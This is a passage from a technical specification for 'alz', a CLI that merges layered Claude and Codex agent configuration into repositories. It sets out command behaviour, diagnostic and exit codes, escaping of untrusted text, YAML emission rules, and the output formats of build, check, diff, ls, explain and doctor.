| `alz check [--skip-identity]` | Rebuild in memory and fail if the repo differs from it or from the lock (for CI and the Stop hook), or if the effective git identity differs from the declared commit identity (§9.4). `--skip-identity` skips the identity check, for CI runners and for people other than the owner. |
| `alz update [<layer>]` | Re-resolve refs to the newest matching versions and rebuild. |
| `alz ls [--live]` | List what the stack builds and the layer that decides each item. `--live` also asks Claude what it loaded (one short model call) and fails on any built item it did not load. |
| `alz explain <type> <name>` | Show which layers contributed to an item, in order, with the merged result. |
| `alz diff` | Show the effective change a pending build would make. |
| `alz doctor` | Check account dirs for collisions, target versions vs. adapter expectations, unfilled slots, budgets. *Planned (TASK-50.4):* per repository, by name only, a named account folder that does not exist and an account variable `set outside alz`, adding `mise or direnv is active here` when `__MISE_DIFF` or `DIRENV_DIFF` exists (never reading their values). Nothing is shared by default (decision-17), so no item is reported as not linked; at most one informational line per account folder names the items that are links. The blocked folders (`~/.claude-alz-blocked`, `~/.codex-alz-blocked`) are not counted as accounts, and one that exists gets a warning, since Claude creates a missing folder at a blocked start. Prints a static notice that workspace trust is per account (§7.13, §9.1). |
| `alz lint [--layer <path>]` | Validate a layer: schema, leak guard, slot declarations. |
| `alz publish` | Lint, then tag `v<version>` on a layer repo (no push without `--push`). |
| `alz run <tool> [--account <name>] [args…]` | *Planned (TASK-50.3).* Start `claude` or `codex` on the account resolved for the working directory (§7.13), or with `--account <name>` for this run only; `--account default` uses the default account, and the `alz` shell function passes an `alz use` choice as `--account`. Arguments and exit code pass through unchanged. It fails closed before anything starts, exits non-zero and never uses the default account or a newly declared one when the tool or account is unknown, when the account's folder does not exist (it lists the folders that exist by name only), or when in an allowed repository a cache miss (it says to run `alz build`) or a changed declaration or source (it says to run `alz account allow`) skips the layer step. An account variable set outside alz is kept with a warning unless `--account` is given. Needs no shell hook and never fetches. |
| `alz use <tool> --account <name>`, `alz use <tool> --reset` | *Planned (TASK-50.6).* Set that tool's account for the current terminal until `--reset`; a `cd` does not undo it. The choice lives in unexported variables of the `alz` shell function, never in the environment. It fails closed as `alz run` does. Needs the hook from `alz activate`; without it, changes nothing, prints the `eval` line to add, and exits non-zero. |
| `alz activate zsh\|bash` | *Planned (TASK-50.6).* Print the shell hook for `eval "$(alz activate zsh)"`. It defines the `alz` shell function that `alz use` needs and, when loaded and at each prompt where the working directory changed, sets or unsets each target's account variable and its `ALZ_SET_*` marker (§7.13). When a named account cannot apply it warns and always sets the variable to the missing named folder, the recorded account (cache miss, same source) or the blocked folder, never to a newly declared account or the default account. Its evaluated output holds only `export NAME='value'` and `unset NAME` lines; messages go to standard error. |
| `alz account which [--use <target>=<name>]…` | Print the resolved account per target and its source (`use`, `environment`, `user config`, `layer`, `default`), the reason for each skipped step, and the paths of `accounts.yaml` and `allowed.yaml` (§7.13). `--use` is how the `alz` shell function passes an `alz use` choice (TASK-50.6); nothing in the environment is read as one. When a named account fails closed it prints `layer step skipped (<reason>); fails closed`, what the hook applies (the missing folder, the recorded account or the blocked folder) and the fix command. Prints the `alz account allow` command only when an allowed entry has changed, and lists each valid `allowed.yaml` entry whose root does not exist here as a stale approval (root quoted, `~` for `$HOME`). Warnings go to standard error. Never fetches, runs git or writes. Exits 0 when every target resolves (warnings included), 1 when any target fails closed, 2 for a usage error. |
| `alz account allow [--remove]` | Show the account this repository's layers name per target, the declaring layer, its source, `ref` and revision, and ask the person to confirm by typing each distinct account name; then, under a lock file, record the repository's real root, the per-target map and the source in `allowed.yaml`, replacing any entry for that root (§7.13, §9.1). `--remove` shows the recorded entry, asks for its names the same way, and removes this root's entry under the same lock file. Both refuse and change nothing without a terminal or inside an agent session, checked before any file system call; there is no `--yes`, and `--yes`, `-y` or any other option or argument is a usage error. They refuse, changing nothing, in every state of `allowed.yaml` that the reader ignores, and never repair it. On a cache miss `allow` changes nothing and says to run `alz build`. Until it runs, and after the map or the source changes, a layer-named account does not apply. Exits 0 when done, when it is already allowed or when there is nothing to remove, 1 when it refuses or the person does not confirm, 2 for a usage error. |
| `alz account init <name> [--share <item>]… [--dry-run]` | *Planned (TASK-50.5).* Create the account folders for `<name>` with mode `0700`; by default nothing else (decision-17). Each `--share <item>` links that item to the default folder's copy, if it exists there, with a warning that names its limits; it accepts only the items listed in §7.13 (`agents`, `commands`, `CLAUDE.md`, `skills`, `plugins`, `settings.json`, `projects`, `AGENTS.md`, `sessions`, `memories`) and rejects any other before planning. Claude's `skills/` and `plugins/` are linked entry by entry, keeping `synced/` and `.trash/` per account. Refuses the names `default`, `alz-blocked` and the configured `default_name`. `--dry-run` lists every folder it would create, every item it would link and every existing item it would move aside (rename in the same folder to `<item>.alz-backup-<UTC timestamp>`), and changes nothing. Otherwise it plans everything first, stops on any problem, and prints each backup's path. Rerunning it with the same arguments changes nothing, except to link entries added since to a shared `skills/` or `plugins/`. |

Expose these as mise tasks in each repo: `mise run alz:build`, `alz:check`, etc.

**Implementation:** TypeScript on Node ≥ 22 (the oldest Node line still supported), so the CLI
runs under whatever Node a project pins. Runtimes pinned by mise. No `.js` extensions on
relative imports. Single package, distributed through npm and runnable with `npx`.
Dependencies kept minimal (YAML parser, glob, a TOML writer, a diff library).

### 10.1 Output and exit codes

decision-26 (TASK-55.3). This section applies to every command; each command's own text adds to
it. The Rust `alz` follows it from R2 (TASK-55.3) on. The TypeScript `alz` already uses the same
diagnostic line and exit codes, and differs where this section says so.

**Streams.** What a command reports goes to standard output: the summary of `alz lint`, the lists
of `alz ls` and `alz explain`, the lines of `alz account which`, help and the version.
Diagnostics (errors and warnings), usage errors and the internal-failure message go to standard
error.

**Diagnostic line.** Each diagnostic is one line on standard error:

```text
<level> [<code>] <where>: <message>
```

- `<level>` is `error`, `warning` or `note`. A note says what a command did or found that is
  not a problem, such as how `--adopt` took a file; it never changes the exit code (TASK-55.6).
- `<code>` is a short kebab-case name that the spec gives, for example `layer`, `manifest`,
  `no-manifest`, `lock`, `yaml`, `yaml-tag`, `source` or `cache`. The code is part of the
  contract. The message is part of it only where the spec quotes it.
- `<where>` locates the problem:
  - a file of a layer is `<layer>:<path>`, where `<layer>` is the layer's name, or, while the name
    is not known (its `layer.yaml` did not parse or did not pass the schema), the layer
    directory or stack entry as it was given;
  - a file of the repository, such as `layer.yaml` or `layer.lock`, is its path from the
    repository root;
  - a YAML or JSON error adds `:<line>:<column>`, both counted from 1, the column in characters;
  - when nothing can be located, `<where>: ` is left out.
- `<message>` says what is wrong, on the same line.

**Schema errors** (TASK-55.3). A schema error names the field by its key path and says what is
wrong. It never prints the field's value.
- A key path joins field names with `.` and writes the n-th item of a list as `[<n>]`, counted
  from 0: `account.claude`, `stack[1].ref`, `workspace.add_dirs[0]`.
- A field name that the spec defines is printed as it is.
- A key taken from the file, such as an unknown field or a duplicate key, is printed in single
  quotes. Its control and format characters are removed (class 1 below), and it is cut after 64
  code points, counted after that removal, with `…` added when it is cut. A single quote inside
  the key is written twice, as in a YAML single-quoted scalar (`it's` is printed `'it''s'`), so
  the key cannot close its own quotes and pass the rest as message text; a backslash is printed
  as it is, and the cut counts the key's own code points, never the added quotes. Such a quoted
  key is the only text from the file that a YAML, JSON or schema diagnostic may hold.

The TypeScript `alz` prints more: unknown field names in full, a refused `ref` and refused
`workspace` paths (reference drift, TASK-55.3).

**Merge diagnostics** (TASK-55.5). These are the codes of §7 and §9.2. Each names the layer and
the file as `<where>`.

| Code | Level | Raised for |
| --- | --- | --- |
| `frontmatter` | error | a block that is not closed (`frontmatter is not closed with '---'`), a block that is not a mapping (`frontmatter must be a YAML mapping`), a Markdown file without a block that is not valid UTF-8 (§4.1) |
| `instructions` | error | an instruction file's unknown field or `mode` (§7.1) |
| `agent` | error | an agent's schema: name (the file stem), description, unknown tool, skill name, `memory`, `permission_mode`, a native key with a neutral field, `mcpServers`, `mcp_servers` or `hooks` in native fields; an overlay's fields other than `extends` and `mode` (§7.2) |
| `agent-duplicate` | error | a second base definition of an agent (§7.2) |
| `agent-overlay` | error | an overlay's `extends` (`extends is required` when it is missing) or `mode`, or removing a tool from an agent without a tool list (§7.2) |
| `agent-replace` | warning | an overlay that replaces the whole body (§7.2) |
| `tool-widen` | error | an overlay that widens a tool, or `allow_widen` in a public layer (§7.2) |
| `skill` | error | a skill directory without `SKILL.md`, a name that is not kebab-case or not the directory's, a missing description (§7.3) |
| `command` | error | a command's schema (§7.4) |
| `skill-command-clash` | error | a skill and a command with one name in one layer (§7.4) |
| `slot` | error | a `provides_slots` entry without its skill, or a `requires_slots` entry that is not a skill name (§7.3) |
| `slot-missing` | error with `strict_slots: true`, else warning | a slot that no layer fills, at `<layer>:layer.yaml` or the preloading agent's file; the warning comes with a stub skill (§7.3) |
| `slot-command` | error | an agent that preloads a command (§7.3, §7.4) |
| `hooks` | error | a hook's schema, an id used twice in one layer or already used (or disabled) by a more general layer, a disable entry with other fields (§7.5) |
| `hook-locked` | error | disabling a locked hook (§7.5) |
| `permissions` | error | the schema of `permissions.yaml` (§7.6) |
| `permission-floor` | error | removing a deny rule of a more general layer, a `default_mode` looser than a floor, or setting a floor field back to `false` (§7.6) |
| `permission-shadowed` | warning | a rule in both `allow` and `deny`, without `<where>` (§7.6) |
| `mcp` | error | a key that is not a server id, a definition's schema, an `mcp.enable` entry that no layer defines (§7.7) |
| `models` | error, or warning | the schema of `models.yaml`, an alias key that is not a target, an agent model that is not an alias; the warning is an alias without a model for a target (§7.8) |
| `settings` | error | a top-level key that is not a target, a target value that is not a mapping, a first-class or reserved native key, a floor key made looser or of another kind (§7.9) |
| `protected-variable` | error | a protected or malformed variable name (§7.9) |
| `rule` | error | a rule's schema (§7.10) |
| `passthrough` | warning, or error | the warning for each passthrough file (§7.11); the error for a folder in `targets/` that is not a known target (§4.1) |
| `leak-forbid` | error | a `forbid_patterns` match or a refused entry (§9.2) |
| `leak-secret` | error | a value that looks like a token (§7.7, §9.2) |
| `leak-email`, `leak-host` | warning | an email address or a private host name in a public layer (§9.2) |
| `identity` | error | a `commit_identity` declared by a layer that may not declare it, or by several client layers (§7.12) |
| `account` | error | an `account` declared by a layer that may not declare it, or by several client layers (§7.13) |
| `unresolved` | error | a reference to a more general layer that is not there: an overlay or `extend` rule without a base, an instruction `replace` or `remove` without a block to act on, disabling an unknown hook, a hook of the same layer or one already disabled, a role or default naming an unknown alias (§7.1, §7.2, §7.5, §7.8, §7.10) |

`alz lint` checks each layer alone (§10) and leaves out `unresolved`. `alz build` reports it.
A diagnostic found by merging layers, such as `permission-floor`, `hook-locked`, a duplicate id
or `protected-variable`, names the file without a line and column. A schema error found while
reading one file adds them where it can.
`permission-shadowed` is the one merge warning without `<where>`: the allow rule and the deny rule
can come from different layers, so the message names the rule only.

How values print in these messages:
- An item name that passed its grammar (an agent, skill, command, rule, hook or server id) is
  printed as it is.
- A key that did not pass is printed quoted, as above.
- A value that a person needs in order to act, such as a deny rule or a tool entry, is printed
  stripped (class 1 below).
- A value refused as a protected variable or as a secret is never printed.

**Build and command diagnostics** (TASK-55.6). These are the codes of §4.3, §4.5, §5.3, §8 and
§10.3.

| Code | Level | Raised for |
| --- | --- | --- |
| `collision` | error | a path the build writes that exists and is not alz's own, is a link or lies under one, or is not a regular file; a file in a managed folder that is not alz's own (§4.3); an `AGENTS.override.md` anywhere in the repository, which hides the generated `AGENTS.md` from Codex (target-facts §8.4); a note from `alz diff` for each such path |
| `check` | error | in `alz check`, a generated file that is missing, differs from a fresh build or is stale, and a `layer.lock` that is out of date (§10.3) |
| `budget` | error | an `AGENTS.md` longer than `instructions_max_lines` or `instructions_max_bytes`, its Commits section included (§7.1) |
| `protected` | warning | a file that a layer ships at a protected path, which the build leaves out (§4.5) |
| `layer` | error | a file or folder name with a control or format character (§5.3), a source of a generated header that holds a control or format character or `-->` (§4.3) |
| `passthrough` | error | a passthrough path that is the path of a generated file after case folding (§4.3, §7.11) |
| `target` | error | a target that has no adapter (§8) |
| `claude-agent` | error | an agent with an empty tools list, whose model is not a Claude model value, or with a native whole number beyond 64 bits, which alz cannot write (§8.1) |
| `tool-scope` | warning | an agent tool with a scope, which Claude cannot keep (§8.1) |
| `hook-on-fail` | warning | `on_fail: deny` on an event where Claude cannot block, or cannot block on a crash (§8.1) |
| `adopt` | error, or note | `--adopt` without a repo layer inside the repository, each problem of the adoption plan; the note says how a native file was adopted (§4.3) |
| `explain` | error | `alz explain` for a name the merged result does not have (§10.3) |
| `ls` | error, or warning | `alz ls --live`: no claude target, a probe that failed, a built item Claude did not load; the warning is a server that is not connected (§10.3) |
| `claude` | warning | a line that Claude printed on its standard error or as non-JSON output during `alz ls --live` |
| `init` | error | `alz init` where a `layer.yaml` exists, with a name that is not a layer name, or with a hub tag that is not a git ref (§10.3) |

**Exit codes.**
- 0: the command did what was asked, with or without warnings.
- 1: it failed, which includes any error diagnostic.
- 2: a usage error.
- 70: an internal failure, which is a bug in alz.

A command whose own text states other codes, such as `alz account which` (§10), uses those.

**Untrusted text** is printed in exactly one of three classes:
1. **Stripped**, in diagnostics. Every control and format character is removed, line feed
   included: U+0000 to U+001F, U+007F to U+009F, U+2028, U+2029 and every character of the
   Unicode general category Cf. The Rust `alz` uses the Cf table of Unicode 17.0, the version
   whose `\p{Cf}` the TypeScript `alz` uses on Node 22.
2. **Escaped**, for text a person decides on, such as the layer source that
   `alz account allow` shows before it asks. The text is printed in double quotes, and nothing
   is removed:
   - printable ASCII (U+0020 to U+007E) stays as it is;
   - `"` and `\` get a backslash before them;
   - every other character is written `\u{XXXX}`, in upper-case hexadecimal with at least four
     digits.

   So two texts that differ only by an invisible or look-alike character never print alike.
3. **Usage output.** Help, usage lines and usage errors are the argument parser's own text, with
   its own line feeds; only their stream and exit code are part of the contract. The argument
   fragments that text repeats are stripped as in class 1, so no line feed, carriage return,
   escape or format character from an argument reaches the output.

Untrusted text that alz writes into a generated YAML file is in none of these classes; §10.2 says
how it is written.

**Help and version.**
- `--help` prints help on standard output and exits 0.
- `--version` and `-V` print `alz <version>` and exit 0.
- A usage error prints `error: …`, a usage line and a hint on standard error, and exits 2.

The TypeScript `alz` prints a bare version and usage text of its own. Scripts must rely on
neither (decision-26).

**Internal failure.** A panic prints exactly
`alz: internal error: this is a bug in alz, please report it`, then a line feed, on standard
error, with no payload, location or backtrace, and the process exits 70.

**`alz lint`.** After its diagnostics, `alz lint` prints one summary line on standard output:
`lint ok: <names>`, or `lint failed: <n> errors in <names>` (`error` when n is 1). `<names>` is
the linted layers' names joined by `, `. A layer whose name is not known (its `layer.yaml` did not
parse or did not pass the schema) appears as its directory as it was given, stripped.

**`alz lint` in a repository** (stack mode, no `--layer`; TASK-55.4.10). It reads the stack
manifest (§5.2) and `layer.lock` (§5.3), and when both are valid resolves every stack entry and
validates the stack as §6 steps 1 and 2 say: the cache, git and the account folders are used as
for `alz build`, except that nothing is written to the repository. The cache is made, and git run
(after its version check), only when an entry is a `git:`, `github:` or pinned `path:` layer, and
only after the walk has accepted that entry's directory; an unpinned `path:` layer is read in
place and is never checked against the lock. A `git:` source that holds credentials is refused
at the manifest (§5.2), before any cache or git access. `<names>` has one name for each stack
entry in stack order: the layer's name, or, when the entry could not be resolved or its
`layer.yaml` did not pass the schema, the entry as written, stripped. When the manifest or the
lock is invalid no layer is resolved and no summary line is printed.

### 10.2 Generated YAML

decision-28 (TASK-55.3.8). alz writes YAML into the frontmatter of the agents, rules and skills it
generates, into the layer files `alz build --adopt` writes, and into `allowed.yaml` (§7.13). This
section says how that document is written; the framing around it (the `---` lines and `# …`
header of a frontmatter block, the header comment of `allowed.yaml`) belongs to the caller. The
Rust `alz` writes the bytes the TypeScript `alz` writes (`stringifyYaml` in `src/core/yaml.ts`:
the `yaml` package 2.9.1, block style, `lineWidth: 0`), except for the reference drift at the
end. The golden samples in `crates/alz-core/tests/fixtures/yaml-emit/samples.json`, made from the
reference by `crates/alz-core/tools/yaml-emit-samples.mjs`, pin the bytes; each sample's `class`
names the rule it shows, and a `drift` field marks a sample alz writes differently.

**Values.** Text, `true` and `false`, integers, lists, and mappings with text keys, in the order
the caller gives (§6 where a section is sorted), with no key twice. Mapping entries read from
layer YAML keep their source order only where the spec says so: the native fields of an agent
(§7.2, TASK-66). Everywhere else they are sorted by key in code-point order, settings and MCP
servers included. A key that is a whole number is ordered like any other key. Nothing else is written: no
null, float, anchor, alias, tag or comment.

**Layout.**
- The document is the top-level value and one line feed. The top-level value is a mapping or a
  list. alz never writes a top-level scalar, so this section gives no rule for one.
- An integer is decimal, with `-` when negative, exact over the 64-bit range. An empty list is
  `[]` and an empty mapping `{}`.
- A list writes each item as `- <item>`, a mapping each entry as `<key>: <value>`, one per line
  at the collection's indent.
- A non-empty list or mapping that is the value of an entry starts on the next line, two spaces
  deeper than its key (`tools:`, then `  - read`). One that is an item of a list starts after its
  `- `, and its later lines are two spaces deeper than the `-` (`- name: a`, then `  role: b`;
  `- - x`, then `  - y`).
- A key whose written form (after quoting) is longer than 1024 UTF-16 code units makes an explicit
  entry: `? <key>`, a line feed, the entry's indent, then `: <value>`, with the value on that line
  even when it is a non-empty list or mapping.
- The *continuation indent* of a text is two spaces more than the indent of the entry or list
  item that holds it.

**Text.** A key or a text value takes the first form that applies:
1. **Double-quoted** when it holds a character that alz's reader refuses (§7.13, "Control
   characters"): U+0000 to U+0008, U+000B to U+001F, U+007F to U+009F, U+2028 or U+2029. They are
   written as escapes (see "Double-quoted"), never raw, which the reference does for U+007F to
   U+009F inside double quotes and for U+2028 and U+2029 anywhere (reference drift, TASK-73).
2. **Quoted** when it starts with U+FEFF, or is made only of spaces and line feeds and holds both.
3. **Quoted** when it is a key that holds a line feed.
4. When plain YAML cannot hold it: it starts with a line feed, tab, space or one of
   `` , [ ] { } # & * ! | > ' " % @ ` ``; it is `?` or `-`, or starts with `?` or `-` and then a
   space or tab; it ends with a line feed, tab, space or `:`; or it holds a line feed or `:`
   followed by a space or tab, a space or tab followed by a line feed, or a line feed, tab or
   space followed by `#`. Then a key, or text without a line feed, is **quoted**, and any other
   text is a **literal block**.
5. A **literal block** when it holds a line feed.
6. **Quoted** when it is a key of the top-level mapping and starts with `---` or `...`.
7. **Quoted** when the YAML 1.2 core schema, or alz's reader, reads it as another type:
   - `~`, `null`, `Null`, `NULL`, `true`, `True`, `TRUE`, `false`, `False`, `FALSE`, or empty;
   - an integer, `[-+]?[0-9]+`, `0o[0-7]+` or `0x[0-9a-fA-F]+`, and, for alz's reader,
     `[-+]0o[0-7]+`, `[-+]0x[0-9a-fA-F]+` and `[-+]?0b[01]+`;
   - a float, `[-+]?(\.[0-9]+|[0-9]+(\.[0-9]*)?)([eE][-+]?[0-9]+)?`, `[-+]?\.(inf|Inf|INF)`,
     `.nan`, `.NaN` or `.NAN`.

   Forms that only YAML 1.1 reads, such as `yes`, `off`, `1_000`, `12:30` or `2024-01-01`, and
   other case, such as `0B1` or `TRue`, stay plain.
8. Otherwise **plain**: the text as it is.

**Quoted.** Text that holds `"`, no `'` and no line feed is written in single quotes as it is
(`'say "hi"'`). All other quoted text is double-quoted.

**Double-quoted.** Start from J, the text as JSON writes a string: `"`, each character, `"`. In J,
`"` is `\"`, `\` is `\\`, U+0008 is `\b`, U+000C `\f`, a line feed `\n`, a carriage return `\r`, a
tab `\t`, and every other character below U+0020, and U+007F to U+009F, U+2028 and U+2029
(reference drift, TASK-73: the reference writes these raw), is `\u` and four lower-case
hexadecimal digits; every other character is as it is. J is written with these changes:
- Each `\uXXXX` becomes YAML's escape: `\0` for U+0000, `\a` for U+0007, `\v` for U+000B, `\e`
  for U+001B, `\N` for U+0085, `\L` for U+2028, `\P` for U+2029, and otherwise `\x` and the last
  two digits (`\x01`, `\x7f`).
- When the text is not a key and J is at least 40 UTF-16 code units long, counted with both
  quotes and with each escape as J writes it, every line feed except one that ends the text is
  written as a line break instead of `\n`: a run of n such line feeds becomes n + 1 line feeds
  and then the continuation indent.
- A space right before a line feed (`\n` or a line break), or right after a run written as line
  breaks, is written `\ `, once when both hold (reference drift, TASK-73: where both hold, the
  reference writes it twice).

**Literal block.** Text that ends in spaces or tabs after its last line feed is quoted instead.
Otherwise let E be the text's trailing run of line feeds, tabs and spaces, and B the text before
E. The block is `|`, then `2` when the first character of B that is not a line feed is a space,
then `-` when E holds no line feed, `+` when E holds two or more or B is empty, and nothing when
it holds one; then a line feed and the lines of the text without its final line feed (when it
ends in one), split at line feeds. The first line is written after the continuation indent even
when it is empty; every later line after the continuation indent, and an empty one as nothing.

**Reading back.** alz's reader (§7.13) reads each document this section writes as the values
written (the round-trip law of TASK-55.3.8), except text that holds a character of rule 1, which
it refuses raw or escaped. YAML that alz reads cannot hold such text, but a file-system path
(`root` and `source` of `allowed.yaml`), a file name (`alz build --adopt` names an adopted agent
after its file, `.claude/agents/<name>.md`) or a string in a JSON file that `alz build --adopt`
converts can. `alz account allow` then refuses to write, since the result does not read back
(§7.13). The escapes keep these characters out of the file's bytes: a viewer or a diff may show
NEL, U+2028 or U+2029 as a line break, so a committed file would review differently from what it
holds, some terminals act on C1 controls, and YAML 1.1 readers take NEL, U+2028 and U+2029 as
line breaks.

The TypeScript `alz` differs (reference drift, decision-30, TASK-73). These change generated
bytes only for the text named; the cutover release (R8, TASK-55.9) lists them.
- It writes plain what alz's reader reads as another value or refuses, and alz quotes it: `0b`
  integers with or without a sign and `0o` and `0x` integers with a sign, which alz's reader
  reads as integers (rule 7); text that starts with U+FEFF, which it refuses (rule 2); and text
  made only of spaces and line feeds that holds both, which it writes as a block that reads back
  without its spaces (rule 2). Samples: class `reference-reads-differently`.
- In long double-quoted text it writes a space between a line feed written as a line break and
  another line feed as `\\ `, which reads back as a backslash; alz writes `\ ` once, which reads
  back as the space ("Double-quoted"). This is reachable by text that rule 1 double-quotes and by
  text that a block cannot hold (it ends in blanks after its last line feed). Samples: class
  `double-quoted-blank-between-line-feeds`, drift `space-between-line-feeds-in-long-double-quoted-text`.
- It writes U+007F to U+009F raw inside double quotes, and U+2028 and U+2029 raw, plain or in a
  block; alz double-quotes the text and escapes them (rule 1 and "Double-quoted"). Because J
  writes each of them as six units, the 40-unit limit of long text is reached sooner than the
  reference's. Samples: drift `escaped-characters-the-reference-writes-raw`.

### 10.3 Output of build, check, diff, ls, explain, doctor and init

TASK-55.6. This section gives the Rust `alz`'s lines; §10.1 gives the streams, the diagnostic line
and the exit codes. Names and paths that come from layers, the repository, the file system or
Claude are printed as validated names or stripped (class 1). `<n> file` and the like take a
plural `s` when `<n>` is not 1. The commit identity steps of `build`, `check` and `init` (§9.4)
and the account note of §7.13 come with R6 (TASK-55.7).

**Shared steps.** `build`, `check`, `diff`, `ls`, `explain` and `doctor` read the manifest and
`layer.lock`, resolve and merge the stack, and render the build in memory (§6). They print its
diagnostics first. `build`, `check`, `diff`, `ls` and `explain` then stop with exit 1 when one of
them is an error. `doctor` reports them as part of its report. The TypeScript `alz explain`
goes on after an error and shows what it merged (reference drift, TASK-55.6).

**`alz build`.**
- A collision prints `error [collision] <path>: exists and was not generated by agent-layerz;
  move it into a layer, or rerun with --adopt to move it into the repo layer`, or the link or
  file-type message of §4.3. Any collision means exit 1, with nothing written.
- On success it writes by §4.3 and prints, on standard output, `built <n> files for <targets>:
  <c> created, <u> updated, <d> deleted (output visibility: <visibility>)`. `<targets>` is the
  manifest's targets joined with `, `.
- With `--adopt`, each note of the plan is `note [adopt] <note>` and each problem
  `error [adopt] <problem>`, followed by `nothing was adopted; fix the problems above and rerun`
  and exit 1, with the repository unchanged. Otherwise each adopted file prints
  `adopted <from> → <to>[, <to>…]`, or `adopted <from> (nothing left to keep)` when nothing of it
  was kept, and the build runs again from the manifest. A collision that is still left is an error.
- The problems of a plan include these, where `<file>` is the native file:
  - `<file>: server '<id>' sets <NAME> to a value; layers never store values. Use "${<NAME>}"
    and export it`;
  - `<file>: server '<id>' uses <keys>, which mcp.yaml does not support yet`;
  - `<file>.<list>: '<rule>' uses a tool agent-layerz does not know`;
  - `<file>: unknown permissionMode '<value>'`;
  - `<file>: tools entry '<entry>' has no neutral form; set it by hand`;
  - `<file>: <layer folder>/<path> already exists`;
  - `<path>: cannot be adopted automatically; move it into a layer by hand`;
  - `<file>: adopting it would write <layer file> with text the layer reader refuses: <rule>;
    fix it in <file> and rerun`, where `<rule>` is the reader's message without the text (§4.3,
    TASK-73).
  Text from the native file is stripped (class 1).

**`alz check`.** It makes no write.
- Each difference is one line: `error [check] <path>: missing`, `error [check] <path>: differs
  from a fresh build`, or `error [check] <path>: is stale` for a file alz owns that the build no
  longer makes.
- Each collision prints as for `alz build`, and an outdated lock prints
  `error [check] layer.lock: out of date`.
- After any of these comes `check failed: run \`alz build\` and commit the result`, and exit 1.
- Otherwise it prints `check passed: <n> generated files match the layers and the lock` on
  standard output, and exits 0.
- `--skip-identity` is accepted and skips §9.4's check.

**`alz diff`.** It makes no write.
- Each change prints a unified diff on standard output, in the order of §4.3 (paths the build
  makes in name order, then the deleted ones), then `layer.lock` when it changes:

  ```text
  --- a/<path>
  +++ b/<path>
  @@ -<old start>,<old count> +<new start>,<new count> @@
  ```

- Context lines start with a space, removed lines with `-` and added lines with `+`.
- Lines end at each line feed. A last line without one is followed by
  `\ No newline at end of file`.
- A created file is compared with empty text, and a deleted file with empty text after it.
- Hunks keep three lines of context, and hunks whose context would meet are joined.
- Both counts are always written. A count of 0 gives as its start the line before the hunk.
- The edit script is a shortest one over lines (Myers), and within a hunk removed lines come
  before added lines. The same two texts always give the same diff.
- Content with a NUL in its first 8192 bytes, or that is not valid UTF-8, prints
  `Binary file <path> changes` instead.
- Each collision is `note [collision] <path>: is not generated by agent-layerz; alz build will
  refuse to overwrite it` on standard error.
- When there is nothing to change it prints `no changes`.
- Exit 0, unless the build had an error. The TypeScript `alz` prints the patch text of the `diff`
  package (jsdiff), whose header, hunks and binary test differ (reference drift, TASK-55.6).

**`alz ls [--live]`.**
- Six sections are printed in order: `agents`, `skills`, `commands`, `rules`, `hooks` and `mcp`,
  the last listing the enabled servers.
- Each section starts with `<section> (<count>)`, then one line per item:
  `  <name padded with spaces to 28 characters> <layer>`. `<layer>` is the name of the most
  specific layer that contributed to the item.
- Items are in name order, hooks in stack and file order, and servers in `mcp.enable` order.
- `--live` needs the `claude` target, else `error [ls] --live needs the claude target`. It prints
  a blank line and `asking <bin> what it loads here (one short model call)…`, then runs `<bin>`
  (`ALZ_CLAUDE_BIN`, else `claude`) once in the repository. The arguments are `-p "Reply with
  OK." --output-format stream-json --verbose --max-turns 1`, and alz reads the `system` `init`
  event (target-facts §0.2).
- A probe that fails is `error [ls] <reason>`.
- A built agent or skill that Claude did not load is `error [ls] agent '<name>' was built but
  Claude did not load it` (or `skill`). An enabled server Claude did not start is
  `error [ls] mcp '<id>' is enabled but Claude did not start it`, and one it did not connect is
  `warning [ls] mcp '<id>' is <status>`.
- Each other line Claude printed is `warning [claude] <line>`.
- Then come `claude loaded <a> agents, <s> skills and commands`, and the lines
  `  not from layers, agents: <names>` and `  not from layers, skills: <names>` when there are
  any. Names holding `:` (plugin skills) are left out of the second.
- Last is `ls --live: Claude matches the build` (exit 0) or
  `ls --live: Claude does not match the build` (exit 1).

**`alz explain <type> <name>`.**
- `<type>` is one of `agent`, `skill`, `command`, `rule`, `hook`, `mcp` and `instruction`, and
  another is a usage error.
- It prints `<type> <name>`, `sources, general → specific:`, and `  <i>. <source> — <action>` for
  each contribution, counted from 1. For an `instruction`, `<name>` is the file name, such as
  `00-core.md`, and each block's action is `block`.
- `<source>` is written as in a header (§4.3), `<layer>@<rev>:<file>`, naming the file that
  contributed. `<action>` is the kind's word:
  - `base` for an agent's definition, and `<mode>: <changes>` for an overlay. `<mode>` is
    `extend` or `replace`, and `<changes>` is joined with `; `, or `no changes` when there is
    none. A change is a neutral field's name, `<target> fields`, `skills <edits>`,
    `targets <edits>`, `tools <edits>`, `body replaced` or `body section`.
  - `skill`, `command`, `rule`, and `stub` from the source `slot stub`.
  - `hook <id>` and `server <id>`.
  - `extend: paths +[<globs joined with , >]` for a rule that extends another, for example
    `2. shop-api:rules/testing.md — extend: paths +[e2e/**]`.
  - A definition that a more specific layer replaced gets ` (overridden)` after its word.
  Headers name only the contributions that are not overridden.
- A server that is defined but not enabled first prints `mcp <name> is defined but not enabled
  (add it to mcp.enable in layer.yaml)`.
- Then, for the output file when the build makes it, a blank line, `merged result (<path>):` and
  the file's text. The output files are `.claude/agents/<name>.md`,
  `.claude/skills/<name>/SKILL.md`, `.claude/rules/<name>.md`, `.claude/settings.json` for a
  hook, `.mcp.json` and `AGENTS.md`.
- A name the merged result does not have is `error [explain] no <type> named '<name>' in the
  merged result`, and exit 1.

**`alz doctor`.** Its report goes to standard output, line by line:
- `agent-layerz doctor: <repository root>`.
- With the claude target, `claude account dirs:` and then, for each account folder (`~/.claude`,
  each `~/.claude-*`, and the folder `CLAUDE_CONFIG_DIR` names), either `  none found` or
  `  <folder>: no collisions` or `  <folder>: <n> collisions`. Under it come
  `    collision: skill '<name>' also exists in <folder>/skills (Claude: a user skill beats the
  project one, silently)` and `    collision: agent '<name>' also exists in <folder>/agents (move
  it into a layer)`, and `    note: <folder>/CLAUDE.md is loaded into every session as well`.
  alz lists names in those folders and checks whether `CLAUDE.md` exists. It opens no file there
  (§9.1).
- The version, from `<bin> --version`: `claude: not found; version check skipped`, or
  `claude: <version> (verified range >=<min> <<below>)`, or `warning: claude <version> is outside
  the verified range >=<min> <<below>; re-check docs/target-facts.md`.
- For a hub, `warning: client root <client root>/<file> exists; remove it (put client content in
  the hub layer)` for `CLAUDE.md` and `AGENTS.md`, and `warning: client root <client root> is a git
  repo; it should not be (its .claude/ and AGENTS.md would load in every repo)`.
- For each `workspace.add_dirs` entry, `warning: workspace dir <dir> does not exist (<path>)`, or
